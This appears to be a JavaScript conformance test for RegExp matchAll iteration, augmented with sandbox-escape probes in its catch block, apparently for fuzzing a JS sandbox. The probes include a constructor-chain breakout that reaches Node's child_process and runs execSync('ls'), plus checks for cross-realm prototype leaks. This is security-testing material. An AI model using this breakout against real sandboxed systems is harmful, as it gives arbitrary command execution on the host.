try {
    var iter = /./g[Symbol.matchAll]('');
    var execResult = {
        get '0'() {
            return {
                toString() {
                    return '';
                }
            };
        }
    };
    var internalRegExp;
    RegExp.prototype.exec = function () {
        internalRegExp = this;
        return execResult;
    };
    var result = iter.next();
    assert.sameValue(internalRegExp.lastIndex, 1);
    assert.sameValue(result.value, execResult);
    assert(!result.done);
    result = iter.next();
    assert.sameValue(internalRegExp.lastIndex, 2);
    assert.sameValue(result.value, execResult);
    assert(!result.done);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}